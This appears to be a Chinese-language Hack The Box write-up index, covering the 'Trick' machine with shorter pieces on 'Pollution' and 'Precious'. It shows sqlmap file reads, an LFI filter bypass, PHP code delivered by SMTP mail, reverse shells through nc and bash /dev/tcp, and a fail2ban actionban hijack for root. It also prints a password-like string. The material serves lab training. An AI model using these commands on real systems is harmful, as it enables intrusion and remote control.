\u6ce8\u5165\u7684\u653b\u51fb\uff0c\u4f46\u662f\uff0c\u7531\u4e8e\u6f0f\u6d1e\u7684\u65f6\u95f4\u9650\u5236\u6027\u8d28\uff0c\u6570\u636e\u7684\u63d0\u53d6\u5c06\u975e\u5e38\u7f13\u6162\u3002\u8ba9\u6211\u4eec\u770b\u770b\u662f\u5426\u8fd8\u6709\u5176\u4ed6\u6709\u6548\u7684\u6ce8\u5165\u6280\u672f\u3002\u4e3a\u6b64\uff0c\u6211\u4eec\u5c06\u4f7f\u7528 sqlmap \u4e2d\u7684 <code>technique</code> flag \u6765\u6307\u793a\u5b83\u4f7f\u7528\u7279\u5b9a\u6280\u672f\u3002 sqlmap\u6709\u4ee5\u4e0b\u53ef\u4ee5\u8bbe\u7f6e\u7684\u6280\u5de7\uff1a</p> <ul> <li>B: Boolean-based blind </li> <li>E: Error-based </li> <li>U: Union query-based </li> <li>S: Stacked queries </li> <li>T: Time-based blind </li> <li>Q: Inline queries</li> </ul> <p>\u9274\u4e8e\u6211\u4eec\u4e0d\u60f3\u8981\u4efb\u4f55\u6162\u67e5\u8be2\uff0c\u6211\u4eec\u5c06\u5220\u9664 T \u548c Q\uff0c\u800c\u662f\u4f7f\u7528 BEUS \u4f5c\u4e3a\u6211\u4eec\u7684\u6f5c\u5728\u6280\u672f\u3002\u6b64\u5916\uff0c\u6211\u4eec\u5e0c\u671b\u63d0\u9ad8\u6d4b\u8bd5\u7684\u6c34\u5e73\u548c\u98ce\u9669\uff0c\u4ee5\u786e\u4fdd\u6b63\u786e\u8bc6\u522b\u4efb\u4f55\u6280\u672f\u3002</p> <pre><code>sqlmap -u http://preprod-payroll.trick.htb/ajax.php?action=login --data=\"username=abc&amp;password=abc\" -p username --level 5 --risk 3 --technique=BEUS --batch\n</code></pre> <p>![[Pasted image 20221104113558.png]]</p> <p>\u8f93\u51fa\u663e\u793a\u8be5\u9875\u9762\u4e5f\u5bb9\u6613\u53d7\u5230\u57fa\u4e8e\u5e03\u5c14\u548c\u57fa\u4e8e\u9519\u8bef\u7684\u6ce8\u5165\u67e5\u8be2\u7684\u653b\u51fb\uff0c\u8fd9\u4e0e\u57fa\u4e8e\u65f6\u95f4\u7684\u67e5\u8be2\u76f8\u6bd4\u8981\u5feb\u5f97\u591a\u3002</p> <p>\u63a5\u4e0b\u6765\uff0c\u6211\u4eec\u6765\u5217\u4e3e\u4e00\u4e0b\u6570\u636e\u5e93\u7528\u6237\u62e5\u6709\u7684\u6743\u9650\u3002</p> <pre><code>sqlmap -u http://preprod-payroll.trick.htb/ajax.php?action=login --data=\"username=abc&amp;password=abc\" -p username --privileges\n</code></pre> <p>![[Pasted image 20221104113659.png]]</p> <p>\u4ece\u8f93\u51fa\u4e2d\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u6570\u636e\u5e93\u7528\u6237\u5df2\u88ab\u6388\u4e88 FILE \u6743\u9650\uff0c\u8fd9\u610f\u5473\u7740\u6211\u4eec\u53ef\u4ee5\u6f5c\u5728\u5730\u8bfb\u53d6\u7cfb\u7edf\u6587\u4ef6\u3002\u8ba9\u6211\u4eec\u4ece\u9605\u8bfb <code>/etc/passwd</code> \u5f00\u59cb\u3002</p> <pre><code>$ sqlmap -u http://preprod-payroll.trick.htb/ajax.php?action=login -- data=\"username=abc&amp;password=abc\" -p username --batch --file-read=/etc/passwd\n</code></pre> <p>![[Pasted image 20221104113747.png]]</p> <p>\u8f93\u51fa\u663e\u793a\u6587\u4ef6\u5df2\u4fdd\u5b58\u5728 <code>/home/kali/.local/share/sqlmap/output/preprodpayroll.trick.htb/files/_etc_passwd</code>  \u8ba9\u6211\u4eec\u8bfb\u4e00\u8bfb\u3002</p> <pre><code>cat /home/kali/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_passwd\n</code></pre> <p>![[Pasted image 20221104113857.png]]</p> <p>passwd \u6587\u4ef6\u663e\u793a\u8fdc\u7a0b\u7cfb\u7edf\u4e0a\u5b58\u5728\u540d\u4e3a <code>Michael</code> \u7684\u7528\u6237\u3002\u5047\u8bbe\u6709\u4e00\u4e2a vHost ( <code>preprod-payroll.trick.htb</code> )\uff0c\u6211\u4eec\u53ef\u4ee5\u5c1d\u8bd5\u8bfb\u53d6 Web \u670d\u52a1\u5668\u7684 vHost \u914d\u7f6e</p> <pre><code>$ sqlmap -u http://preprod-payroll.trick.htb/ajax.php?action=login -- data=\"username=abc&amp;password=abc\" -p username --batch --file-read=/etc/nginx/sitesenabled/default\n</code></pre> <p>![[Pasted image 20221104114010.png]]</p> <p>\u8fd0\u884c\u524d\u9762\u7684\u547d\u4ee4\u540e\uff0c\u6211\u4eec\u770b\u5230\u6587\u4ef6\u5df2\u4fdd\u5b58\u5728\u672c\u5730\uff0c\u6211\u4eec\u53ef\u4ee5\u7ee7\u7eed\u8bfb\u53d6\u5b83\uff0c\u5982\u524d\u6240\u793a\u3002</p> <pre><code>$ cat /home/kali/.local/share/sqlmap/output/preprodpayroll.trick.htb/files/_etc_nginx_sites-enabled_default\nserver { \n        listen 80;\n        listen [::]:80;\n        server_name preprod-marketing.trick.htb;\n        root /var/www/market;\n        index index.php;\n        location / { try_files $uri $uri/ =404; } location ~ \\.php$ { include snippets/fastcgi-php.conf;\n        fastcgi_pass unix:/run/php/php7.3-fpm-michael.sock; } } server { listen 80; listen [::]:80; server_name preprod-payroll.trick.htb;\n        root /var/www/payroll; index index.php;\n        location / { try_files $uri $uri/ =404; } location ~ \\.php$ { include snippets/fastcgi-php.conf; fastcgi_pass unix:/run/php/php7.3-fpm.sock; } }\n</code></pre> <p>\u5728\u914d\u7f6e\u6587\u4ef6\u4e2d\uff0c\u6211\u4eec\u770b\u5230\u4e00\u4e2a\u540d\u4e3a <code>preprod-marketing.trick.htb</code> \u7684\u65b0 vHost\u3002\u8ba9\u6211\u4eec\u4e5f\u5c06\u5b83\u6dfb\u52a0\u5230\u6211\u4eec\u7684\u4e3b\u673a\u6587\u4ef6\u4e2d\u3002</p> <pre><code>$ echo '10.10.11.166 preprod-marketing.trick.htb' | sudo tee -a /etc/hosts\n</code></pre>"},{"location":"HTB/HTB-Tirck/#marketing","title":"Marketing","text":"<p>\u5c06\u65b0\u57df\u6dfb\u52a0\u5230\u6211\u4eec\u7684\u4e3b\u673a\u6587\u4ef6\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u8bbf\u95ee\u8be5\u7f51\u7ad9 ![[Pasted image 20221104114406.png]]</p> <p>\u8be5\u9875\u9762\u5305\u542b\u6307\u5411\u5176\u4ed6\u9875\u9762\u7684\u5404\u79cd\u94fe\u63a5\u3002\u5355\u51fb\u670d\u52a1\u6309\u94ae\u5c06\u6211\u4eec\u5e26\u5230\u4e00\u4e2a\u65b0\u9875\u9762\uff0c\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff0c\u6b64\u9875\u9762\u4e2d\u7684 URL \u66f4\u6539\u4e3a http://preprod-marketing.trick.htb/index.php?\u9875\u9762=\u670d\u52a1.html\u3002\u5355\u51fb\u5173\u4e8e\u5c06\u6211\u4eec\u518d\u6b21\u5e26\u5230\u4e00\u4e2a\u65b0\u9875\u9762\u3002\u5b83\u8fd8\u5c06 URL \u66f4\u6539\u4e3a http://preprod-marketing.trick.htb/index.php?page=about.html \u3002\u8fd9\u53ef\u80fd\u610f\u5473\u7740\u8be5\u7f51\u7ad9\u4f7f\u7528 PHP include() \u51fd\u6570\u6765\u663e\u793a\u4e0d\u540c\u7684\u9875\u9762\u3002</p> <p>\u8003\u8651\u4ee5\u4e0b PHP \u4ee3\u7801\u3002</p> <pre><code>&lt;?php\n // Do something if no page is requested\npage = $_GET['page']; // Get the page parameter\n include(\"/var/www/market/\".page); // This includes the page that is requested\n?&gt;\n</code></pre> <p>\u5982\u679c\u4ee3\u7801\u4e0e\u4e0a\u8ff0\u7c7b\u4f3c\uff0c\u5219\u53ef\u80fd\u5bb9\u6613\u53d7\u5230\u672c\u5730\u6587\u4ef6\u5305\u542b\u7684\u5f71\u54cd\u3002\u7531\u4e8e\u6211\u4eec\u77e5\u9053\u57fa\u4e8e Nginx vHost \u914d\u7f6e\u7684\u7ad9\u70b9\u4f4d\u4e8e <code>/var/www/market</code> \u4e2d\uff0c\u56e0\u6b64\u6211\u4eec\u5fc5\u987b\u4e0a 3 \u4e2a\u76ee\u5f55\u6765\u5c1d\u8bd5\u8bfb\u53d6 <code>/etc/passwd</code> \uff0c\u4f46\u662f\uff0c\u5982\u679c\u6211\u4eec\u5c1d\u8bd5\u4f7f\u7528 <code>../</code> \u9875\u9762\u662f\u7a7a\u767d\u7684\u3002\u5bf9\u6b64\u7684\u89e3\u91ca\u53ef\u80fd\u662f\u6709\u4e00\u4e2a\u8fc7\u6ee4\u5668\u6765\u9632\u6b62\u76ee\u5f55\u904d\u5386\uff0c\u5176\u4e2d <code>../</code> \u53ea\u662f\u4ece\u8f93\u5165\u4e2d\u5220\u9664\u3002\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u8bbf\u95ee URL <code>http://preprod-marketing.trick.htb/index.php?page=../about.html</code> \u6765\u6d4b\u8bd5\u5b83\u3002</p> <p>\u8fd9\u6837\u505a\u540e\uff0c\u6211\u4eec\u4f1a\u770b\u5230\u901a\u5e38\u7684 about \u9875\u9762\uff0c\u5373\u4f7f\u8be5\u9875\u9762\u5e94\u8be5\u662f\u7a7a\u7684\uff0c\u56e0\u4e3a\u8bf7\u6c42\u7684\u6587\u4ef6\u4e0d\u5b58\u5728\u3002\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u5c06\u9875\u9762\u53c2\u6570\u4ece <code>../about.html</code> \u66f4\u6539\u4e3a <code>about.html../</code> \u6765\u518d\u6b21\u68c0\u67e5\u3002\u518d\u4e00\u6b21\uff0c\u6211\u4eec\u5f97\u5230\u4e86\u5173\u4e8e\u9875\u9762\u3002\u8fd9\u53ef\u80fd\u610f\u5473\u7740 <code>../</code> \u4ece URL \u4e2d\u8fc7\u6ee4\u6389\u4e86\u3002</p> <p>\u9274\u4e8e\u6b64\u4fe1\u606f\uff0c\u6211\u4eec\u53ef\u4ee5\u63a8\u6d4b\u4ee3\u7801\u770b\u8d77\u6765\u4e0e\u6b64\u7c7b\u4f3c\u3002</p> <pre><code>&lt;?php\n//Do something if no page is requested\npage = $_GET['page']; //Get the page parameter\ninclude(\"/var/www/market/\" . str_replace(\"../\", \"\", $page)); // remove any ../ from the\nparameter and include the page\n?&gt;\n</code></pre> <p>\u6709\u4e00\u79cd\u53ef\u80fd\u7684\u65b9\u6cd5\u53ef\u4ee5\u4f7f\u7528 <code>....//</code> \u7ed5\u8fc7\u6b64\u8fc7\u6ee4\u5668\u3002\u8fd9\u5c06\u5220\u9664 <code>../</code> \u4e2d\u7684\u4e00\u4e2a\uff0c\u800c\u53e6\u4e00\u4e2a\u4ecd\u7136\u5b58\u5728\u3002\u8ba9\u6211\u4eec\u53bb <code>http://preprod-marketing.trick.htb/index.php</code> \u8bd5\u8bd5\u5427\uff1f\u9875\u9762<code>=....//....//....//....//....//etc/passwd</code> </p> <p>![[Pasted image 20221104114851.png]]</p> <p>\u8be5\u9875\u9762\u663e\u793a <code>/etc/passwd</code> \u6587\u4ef6\uff0c\u8fd9\u610f\u5473\u7740\u6211\u4eec\u7684\u6709\u6548\u8d1f\u8f7d\u5de5\u4f5c\u3002</p>"},{"location":"HTB/HTB-Tirck/#exploitation","title":"Exploitation","text":""},{"location":"HTB/HTB-Tirck/#foothold","title":"Foothold","text":"<p>\u5728\u8fd9\u4e00\u70b9\u4e0a\uff0c\u8fd9\u4f3c\u4e4e\u662f\u4e00\u4e2a\u6b7b\u80e1\u540c\uff0c\u56e0\u4e3a\u6211\u4eec\u8fd8\u6ca1\u6709\u627e\u5230\u4e00\u79cd\u5c06 PHP \u4ee3\u7801\u53d1\u9001\u5230\u6587\u4ef6\u7684\u65b9\u6cd5\u3002\u56de\u987e\u6211\u4eec\u6700\u521d\u7684 Nmap\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u7aef\u53e3 25 \u4e0a\u6709\u4e00\u4e2a SMTP \u670d\u52a1\u5668\u3002Linux \u6709\u4e00\u4e2a\u76ee\u5f55 <code>/var/mail/</code> \u4f9b\u7528\u6237\u63a5\u6536\u6d88\u606f\u3002\u5982\u679c\u6211\u4eec\u53ef\u4ee5\u5411 <code>michael</code> \u53d1\u9001\u5e26\u6709 PHP \u4ee3\u7801\u7684\u90ae\u4ef6\uff0c\u5b83\u5c06\u51fa\u73b0\u5728 <code>/var/mail/michael</code> \u4e2d\u3002\u4e3a\u4e86\u8fde\u63a5\u548c\u53d1\u9001\u6211\u4eec\u7684\u6076\u610f\u90ae\u4ef6\uff0c\u6211\u4eec\u5c06\u4f7f\u7528 <code>netcat</code> \u3002</p> <pre><code>$ nc trick.htb 25\n</code></pre> <p>![[Pasted image 20221104115052.png]]</p> <p>\u5728\u4e0a\u9762\u4f7f\u7528\u7684\u547d\u4ee4\u4e2d\uff0c\u6211\u4eec\u5411\u4fa6\u542c\u7aef\u53e3 25 \u7684\u90ae\u4ef6\u670d\u52a1\u5668\u53d1\u9001\u4e00\u5c01\u7535\u5b50\u90ae\u4ef6\u3002 <code>helo x</code> \u662f\u4e00\u4e2a\u6253\u5f00 /\"greet\" \u5230\u670d\u52a1\u5668\u7684\u547d\u4ee4\uff0c<code>mail from:</code> \u4e3a\u670d\u52a1\u5668\u63d0\u4f9b\u53d1\u4ef6\u4eba\u7684\u540d\u79f0\uff0c\u800c <code>rcpt to:</code> \u7ed9\u51fa\u6536\u4ef6\u4eba\u7684\u59d3\u540d\u3002 <code>data</code> \u901a\u77e5\u670d\u52a1\u5668\u4ee5\u4e0b\u6570\u636e\u5c06\u662f\u90ae\u4ef6\u7684\u4e3b\u8981\u6d88\u606f\uff0c\u670d\u52a1\u5668\u4ee5 <code>&lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;</code> \u7ed3\u675f\u6570\u636e\uff0c\u8fd9\u662f\u4e00\u4e2a <code>.</code> \u5728\u4e24\u6761\u65b0\u7ebf\u4e4b\u95f4\u3002\u6211\u4eec\u5c06\u6211\u4eec\u7684 PHP shell \u4f5c\u4e3a\u6570\u636e\u5e76\u4ee5\u4e00\u4e2a\u70b9\u7ed3\u675f\u3002 \u8ba9\u6211\u4eec\u5728\u7aef\u53e3 <code>1337</code> \u4e0a\u542f\u52a8\u4e00\u4e2a <code>netcat</code> \u4fa6\u542c\u5668\u3002</p> <pre><code>$ nc -lvnp 1337\n</code></pre> <p>\u542f\u52a8\u76d1\u542c\u5668\u540e\uff0c\u6211\u4eec\u5c1d\u8bd5\u4f7f\u7528\u672c\u5730\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e\u5728\u7cfb\u7edf\u4e0a\u6267\u884c\u53cd\u5411 shell\uff0c\u65b9\u6cd5\u662f\u8bbf\u95ee <code>URL http://preprod-marketing.trick.htb/index.php?page=..//....//....//....//....//....//var/mail/michael&amp;cmd=nc%2010.10.14.29% 201337%20-e%20/bin/sh</code>\u3002</p> <p>\u4f7f\u7528\u4e4b\u524d\u7684 URL\uff0c\u7f51\u7ad9\u5c06\u8bfb\u53d6\u5305\u542b\u6211\u4eec\u6076\u610f PHP \u4ee3\u7801\u7684\u6587\u4ef6 <code>/var/mail/michael</code> \u5e76\u5c06\u5176\u5305\u542b\u5728\u5b83\u81ea\u5df1\u7684\u6e90\u4ee3\u7801\u4e2d\u3002\u8be5\u4ee3\u7801\u5c06\u83b7\u53d6 <code>cmd</code> \u53c2\u6570\u5e76\u5c06\u5176\u4f5c\u4e3a\u7cfb\u7edf\u547d\u4ee4\u6267\u884c\u3002\u53c2\u6570\u8bbe\u7f6e\u4e3a <code>nc%2010.10.14.29%201337%20-e%20/bin/sh</code> \uff0c\u5373 <code>nc 10.10.14.29 1337 -e /bin/sh</code> \u4e0d\u5e26 URL \u7f16\u7801\u3002\u8bbf\u95ee URL \u4f1a\u5411\u6211\u4eec\u7684 <code>netcat</code> \u4fa6\u542c\u5668\u53d1\u9001\u4e00\u4e2a\u53cd\u5411 shell\u3002</p> <p>![[Pasted image 20221104115932.png]]</p> <p>\u5728\u521d\u6b65\u7ad9\u7a33\u811a\u8ddf\u540e\uff0c\u6211\u4eec\u5f88\u5feb\u5728 michael \u7684\u4e3b\u76ee\u5f55\u4e2d\u627e\u5230\u4e86\u4e00\u4e2a SSH \u5bc6\u94a5\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u5b83\u6765\u66f4\u8f7b\u677e\u5730\u8bbf\u95ee\u7cfb\u7edf\u3002\u6211\u4eec\u5c06\u5b83\u590d\u5236\u5230\u6211\u4eec\u7684\u7cfb\u7edf\uff0c\u5e76\u4f7f\u7528 <code>chmod</code> \u66f4\u6539\u6587\u4ef6\u7684\u6743\u9650\u3002</p> <pre><code>chmod 600 id_rsa \nssh -i id_rsa michael@trick.htb\n</code></pre> <p>\u6211\u4eec\u8fd8\u6ce8\u610f\u5230\u7528\u6237 michael \u6240\u5728\u7684 <code>security</code> \u7ec4</p>"},{"location":"HTB/HTB-Tirck/#privilege-escalation","title":"Privilege Escalation","text":"<p>\u767b\u5f55\u540e\uff0c\u8ba9\u6211\u4eec\u68c0\u67e5\u5141\u8bb8\u6211\u4eec\u8fd0\u884c\u7684 <code>sudo</code> \u547d\u4ee4</p> <pre><code>$ sudo -l\n</code></pre> <p>![[Pasted image 20221104120202.png]]</p> <p>\u8f93\u51fa\u663e\u793a\u6211\u4eec\u53ef\u4ee5\u4ee5 <code>root</code> \u7528\u6237\u8eab\u4efd\u91cd\u65b0\u542f\u52a8 <code>fail2ban</code> \u670d\u52a1\u3002\u8ba9\u6211\u4eec\u68c0\u67e5\u4e00\u4e0b fail2ban \u7684\u914d\u7f6e\uff0c\u770b\u770b\u6211\u4eec\u662f\u5426\u80fd\u627e\u5230\u611f\u5174\u8da3\u7684\u4e1c\u897f\u3002</p> <pre><code>$ cd /etc/fail2ban \n$ ls -la\n</code></pre> <p>![[Pasted image 20221104120304.png]]</p> <p>\u6211\u4eec\u770b\u5230\u76ee\u5f55 <code>action.d</code> \u5f52\u6211\u4eec\u6240\u5c5e\u7684\u7ec4 <code>security</code> \u6240\u6709\u3002\u6743\u9650\u4e5f\u8bbe\u7f6e\u4e3a <code>rwxrwx---</code> \uff0c\u8fd9\u610f\u5473\u7740 <code>security</code> \u7ec4\u5bf9\u8be5\u6587\u4ef6\u5939\u5177\u6709\u8bfb\u53d6\u3001\u5199\u5165\u548c\u6267\u884c\u6743\u9650\u3002\u8fdb\u5165 <code>action.d</code> \u76ee\u5f55\uff0c\u6211\u4eec\u770b\u4e00\u4e0b\u91cc\u9762\u7684\u6587\u4ef6\u3002</p> <pre><code>$ ls -l\n</code></pre> <p>![[Pasted image 20221104120407.png]]</p> <p>\u6211\u4eec\u6b63\u5728\u5bfb\u627e\u7684\u6587\u4ef6\u662f <code>iptables-multiport.conf</code> \uff0c\u7279\u522b\u662f\u4e00\u884c\u3002\u6211\u4eec\u6b63\u5728\u5bfb\u627e\u5305\u542b\u5728\u7528\u6237\u88ab\u7981\u6b62\u65f6\u6b63\u5728\u8fd0\u884c\u7684\u547d\u4ee4\u7684 <code>actionban</code>\u3002</p> <pre><code>$ cat iptables-multiport.conf\n</code></pre> <p>![[Pasted image 20221104120537.png]]</p> <p>\u524d\u9762\u63d0\u5230\u7684\u53d8\u91cf\u5c31\u662f\u6211\u4eec\u60f3\u8981\u6539\u53d8\u7684\u3002\u4f46\u662f\uff0c\u6211\u4eec\u6ca1\u6709\u5bf9\u8be5\u6587\u4ef6\u7684\u5199\u8bbf\u95ee\u6743\uff0c\u5b83\u4e5f\u4e0d\u5c5e\u4e8e\u6211\u4eec\u53ef\u4ee5\u8bbf\u95ee\u7684\u4efb\u4f55\u4e1c\u897f\u3002\u7136\u800c\uff0c\u8be5\u76ee\u5f55\u5f52 <code>security</code> \u6240\u6709\uff0c\u8fd9\u610f\u5473\u7740\u6211\u4eec\u53ef\u4ee5\u79fb\u52a8\u6587\u4ef6\u5e76\u66ff\u6362\u5b83\u4eec\u3002</p> <pre><code>mv iptables-multiport.conf .old \ncp .old iptables-multiport.conf \nls -l iptables-multiport.conf\n</code></pre> <p>![[Pasted image 20221104120635.png]]</p> <p>\u5982\u8f93\u51fa\u6240\u793a\uff0c\u6211\u4eec\u73b0\u5728\u53ef\u4ee5\u5b8c\u5168\u63a7\u5236 <code>iptables-multiport.conf</code> \u3002\u6211\u4eec\u7f16\u8f91\u914d\u7f6e\u6587\u4ef6\u5e76\u5c06 <code>actionban</code> \u53d8\u91cf\u66f4\u6539\u4e3a <code>actionban = /tmp/shell.sh</code> \u3002\u4e4b\u540e\u6211\u4eec\u5728 <code>/tmp/shell.sh</code> \u521b\u5efa\u4e00\u4e2a\u6587\u4ef6\uff0c\u5185\u5bb9\u5982\u4e0b\u3002</p> <pre><code>#!/bin/bash \nbash -i &gt;&amp; /dev/tcp/10.10.14.29/1337 0&gt;&amp;1\n</code></pre> <p>\u6211\u4eec\u8fd8\u4f7f\u7528 <code>chmod</code> \u4f7f\u5176\u53ef\u6267\u884c\u3002</p> <pre><code>chmod +x /tmp/shell.sh\n</code></pre> <p>Finally, let's try restarting fail2ban using sudo.</p> <pre><code>$ sudo /etc/init.d/fail2ban restart\n</code></pre> <p>![[Pasted image 20221104120914.png]]</p> <p>\u5269\u4e0b\u7684\u5c31\u662f\u542f\u52a8\u4e00\u4e2a <code>netcat</code> \u76d1\u542c\u5668\u5e76\u89e6\u53d1 <code>ban</code> \u547d\u4ee4\u3002\u8ba9\u6211\u4eec\u9996\u5148\u542f\u52a8\u6211\u4eec\u7684 <code>netcat</code> \u76d1\u542c\u5668\u3002</p> <pre><code>$ nc -lvnp 1337\n</code></pre> <p>\u63a5\u4e0b\u6765\uff0c\u8ba9\u6211\u4eec\u5c1d\u8bd5\u4f7f\u7528\u9519\u8bef\u7684\u51ed\u636e\u767b\u5f55\u6765\u89e6\u53d1\u7981\u4ee4\u3002\u6211\u4eec\u53ef\u4ee5\u7b80\u5355\u5730\u4f7f\u7528 SSH \u5e76\u6309\u56de\u8f66\u51e0\u6b21\u3002</p> <pre><code>$ ssh michael@trick.htb\n</code></pre> <p>\u4e0d\u4e45\u4e4b\u540e\uff0c\u6211\u4eec\u5728 <code>netcat</code> \u4fa6\u542c\u5668\u4e0a\u6536\u5230\u4e86\u4e00\u4e2a\u53cd\u5411 shell\u3002 ![[Pasted image 20221104121119.png]]</p> <p>Adinistrator SuperGucciRainbowCake</p>"},{"location":"HTB/Pollution/","title":"Pollution","text":"<p>Pollution \u662f\u4e00\u4e2a\u5177\u6709\u6311\u6218\u6027\u7684 Linux \u673a\u5668\uff0c\u6709\u51e0\u4e2a\u9519\u7efc\u590d\u6742\u7684\u6f0f\u6d1e\u53ef\u4f9b\u5229\u7528\uff0c\u4f8b\u5982 XXE \u548c\u5229\u7528 LFI \u6765\u83b7\u5f97 RCE\uff0c\u4ee5\u53ca\u539f\u578b\u6c61\u67d3\u3002 \u6700\u521d\uff0c\u6211\u4eec\u901a\u8fc7XXE\u8bfb\u53d6\u5173\u952e\u6587\u4ef6\uff0c\u4ee5\u7528\u6237 www-data \u83b7\u5f97\u7acb\u8db3\u70b9\uff0c\u7136\u540e\u5229\u7528LFI\u83b7\u5f97RCE\u3002 \u6b64\u5916\uff0c\u6211\u4eec\u53d1\u73b0 php-fpm \u4ee5 victor \u7528\u6237\u8eab\u4efd\u5728\u8fdc\u7a0b\u4e3b\u673a\u7684\u5185\u90e8\u7aef\u53e3\u4e0a\u8fd0\u884c\uff0c\u53ef\u4ee5\u5229\u7528\u5b83\u4ece www-data \u6a2a\u5411\u79fb\u52a8\u5230 victor \u3002 \u6700\u540e\uff0c\u6211\u4eec\u901a\u8fc7\u5229\u7528\u5185\u90e8 NodeJS \u670d\u52a1\u4e0a\u7684\u539f\u578b\u6c61\u67d3\uff0c\u8bbe\u6cd5\u5c06\u6743\u9650\u5347\u7ea7\u5230 root \u7528\u6237\u3002</p> <p>\u9700\u8981\u7684\u6280\u80fd</p> <ul> <li>Web \u679a\u4e3e</li> <li>Linux \u57fa\u7840\u77e5\u8bc6</li> </ul> <p>\u5b66\u5230\u7684\u6280\u80fd</p> <ul> <li>XXE \u5229\u7528</li> <li>LFI2RCE</li> <li>\u4ee3\u7801\u5ba1\u8ba1</li> <li>Prototype Pollution \u5229\u7528</li> </ul> <p>\u679a\u4e3e</p> <p>Nmap</p> <p>\u8ba9\u6211\u4eec\u8fd0\u884c Nmap \u626b\u63cf\u6765\u53d1\u73b0\u8fdc\u7a0b\u4e3b\u673a\u4e0a\u7684\u4efb\u4f55\u5f00\u653e\u7aef\u53e3</p> <pre><code>ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.192 | grep '^[0-9]' | cut -d '/' -f 1 |tr '\\n' ',' | sed s/,$//)\nnmap -p$ports -sV 10.10.11.192\n\nStarting Nmap 7.92 ( https://nmap.org\nNmap scan report for collect .htb (10.10.11.192)\nHost is up (0.18s latency).\nNot shown: 65532 closed tcp ports (reset)\nPORT\nSTATE SERVICE VERSION\n22/tcpopenssh (protocol 2.0)0penSSH 8.4p1 Debian 5+deb11ul80/tcpopenhttpApache httpd 2.4.54 ((Debian))\n80/tcp\n6379/tcp openredisRedis key-value store\nService Info: 0S: Linux; CPE: cpe:/o:linux:linux kernel\n</code></pre> <p>Nmap \u626b\u63cf\u663e\u793a SSH \u6b63\u5728\u5176\u9ed8\u8ba4\u7aef\u53e3\uff08\u5373 22\uff09\u4e0a\u4fa6\u542c\uff0c\u5e76\u4e14 Apache HTTP Web \u670d\u52a1\u5668\u6b63\u5728\u7aef\u53e3 80 \u4e0a\u8fd0\u884c\u3002\u8fdc\u7a0b\u4e3b\u673a\u8fd8\u6709\u4e00\u4e2a Redis \u670d\u52a1\u5668\u4fa6\u542c\u5176\u9ed8\u8ba4\u7aef\u53e3 6379 \u3002</p> <p>HTTP</p> <p>\u6d4f\u89c8\u7aef\u53e3 80 \u540e\uff0c\u6211\u4eec\u770b\u5230\u4e00\u5bb6\u540d\u4e3a\u201cCollect\u201d\u7684\u56de\u6536\u79d1\u6280\u516c\u53f8\u7684\u4e3b\u9875</p> <p>\u7f51\u7ad9\u8fd8\u5177\u6709\u6ce8\u518c\u548c\u767b\u5f55\u529f\u80fd\u3002\u5411\u4e0b\u6eda\u52a8\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u201c\u8054\u7cfb\u6211\u4eec\u201d\u90e8\u5206\uff0c\u5176\u4e2d\u5305\u542b\u57df\u540d\u4e3acollect.htb\u7684\u7535\u5b50\u90ae\u4ef6\u5730\u5740\u3002</p> <p>\u8ba9\u6211\u4eec\u5728 /etc/hosts \u6587\u4ef6\u4e2d\u6dfb\u52a0\u4e00\u4e2acollect.htb\u6761\u76ee\u4ee5\u53ca\u76f8\u5e94\u7684IP\u5730\u5740\u6765\u89e3\u6790\u57df\u540d\u5e76\u5141\u8bb8\u6211\u4eec\u5728\u6d4f\u89c8\u5668\u4e2d\u8bbf\u95ee\u5b83\u3002</p> <pre><code>echo \"10.10.11.192 collect.htb\" | sudo tee -a /etc/hosts\n</code></pre> <p>\u6211\u4eec\u53ef\u4ee5\u679a\u4e3ecollect.htb\u57df\u4ee5\u83b7\u53d6\u6f5c\u5728\u6709\u7528\u7684\u9690\u85cf\u5b50\u57df\u3002\u4e00\u79cd\u65b9\u6cd5\u662f\u4f7f\u7528 wfuzz \u5de5\u5177\uff0c\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u5c06\u5176\u5b89\u88c5\u5728 Ubuntu \u4e0a\u3002</p> <p>SecLists \u7684\u8fd9\u4e2a\u5355\u8bcd\u5217\u8868\u53ef\u7528\u4e8e\u6211\u4eec\u7684\u6a21\u7cca\u6d4b\u8bd5\u76ee\u6807\u3002\u6211\u4eec\u5c06\u5728 wfuzz \u4e2d\u4f7f\u7528\u4ee5\u4e0b\u6807\u5fd7\u3002</p> <pre><code>-c : to get colored output\n-w : to specify the wordlist\n-u : to specify the URL\n-H : to specify the HTTP HOST header\n--hl : to hide the result entries that have the specified number of lines in the repsonse\n</code></pre> <pre><code>wfuzz -c -w /usr/share/wordlists/secLists/subdomains-top1million-5000.txt -u 10.10.11.192 -H \"Host: FUZZ.collect.htb\" --hl 541\n\n000000023:  200  \"forum\"\n000002341:  401  \"developers\"\n</code></pre> <p>\u6211\u4eec\u53ef\u4ee5\u5728 /etc/hosts \u6587\u4ef6\u4e2d\u4e3a\u53d1\u73b0\u7684\u5b50\u57df\u6dfb\u52a0\u4e00\u4e2a\u65b0\u6761\u76ee\u3002</p> <pre><code>echo \"10.10.11.192 forum.collect.htb developers.collect.htb\" | sudo tee -a /etc/hosts\n</code></pre> <p>\u8bbf\u95ee Developers.collect.htb \u65f6\uff0c\u7cfb\u7edf\u4f1a\u63d0\u793a\u6211\u4eec\u8fdb\u884c HTTP \u57fa\u672c\u8eab\u4efd\u9a8c\u8bc1\u767b\u5f55\u3002</p>"},{"location":"HTB/Precious/","title":"Precious","text":"<p>2022 \u5e74 11 \u6708 15 \u65e5 / \u6587\u4ef6\u7f16\u53f7 D22.100.213 \u7f16\u5236\u8005\uff1aC4rm3l0 \u673a\u5668\u4f5c\u8005\uff1aNauten \u96be\u5ea6\uff1a\u7b80\u5355 \u5206\u7c7b\uff1a\u5b98\u65b9</p>"},{"location":"HTB/Precious/#_1","title":"\u6982\u8981","text":"<p>Precious \u662f\u4e00\u6b3e Easy Difficulty Linux \u673a\u5668\uff0c\u4e13\u6ce8\u4e8e Ruby 